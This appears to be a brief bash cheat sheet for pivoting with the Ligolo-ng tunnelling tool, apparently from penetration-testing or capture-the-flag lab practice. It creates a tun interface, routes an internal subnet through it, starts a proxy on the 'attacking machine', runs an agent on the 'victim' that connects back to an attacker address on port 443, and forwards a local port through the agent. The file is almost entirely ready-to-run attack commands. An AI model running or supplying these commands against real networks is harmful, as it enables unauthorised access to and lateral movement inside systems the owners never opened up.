#/bin/bash
sudo ip tuntap add user hanu58 mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.69.0/24 dev ligolo

sudo ./proxy -selfcert -laddr 0.0.0.0:443 # attacking machine

.\agent -connect 10.10.14.22:443 -ignore-cert # victim

# local port to agent
listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:800
